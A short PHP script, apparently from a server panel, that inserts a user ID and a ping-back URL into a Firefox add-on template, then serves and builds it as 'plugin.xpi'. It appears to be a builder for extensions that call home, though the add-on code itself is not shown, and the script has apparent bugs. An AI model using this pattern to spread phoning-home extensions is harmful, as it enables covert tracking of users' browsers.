<?
      require('../../application/firefox.php');
$ping_spot = 'http://'.$_SERVER['SERVER_NAME'].'/r/ping/';
$base_addon_script_FireFox = "../../application/addon.js";
$base_addon_script_FireFox_OPEN = fopen($base_addon_script_FireFox, 'r');
$base_addon_script_FireFox_CONTENT = stream_get_contents($base_addon_script_FireFox_OPEN);

    $base_addon_script_FireFox_NEW_CONTENT = str_replace("%script_id%", $user_hash, $base_addon_script_FireFox_CONTENT);
    $base_addon_script_FireFox_NEW_CONTENT_FINAL = str_replace("%ping_spot%", $ping_spot, $base_addon_script_FireFox_NEW_CONTENT);
    $directory_location = "../../config/addon/";

$file = 'plugin.xpi';

    // Set headers
    header("refresh:5");
    header("Cache-Control: public");
    header("Content-Description: File Transfer");
    header("Content-Disposition: attachment; filename=$file");
    header("Content-Type: application/zip");
    header("Content-Transfer-Encoding: binary");
         // Read the file from disk
     readfile($file);

    build($base_addon_script_FireFox_NEW_CONTENT_FINAL, $directory_location);



  

?>
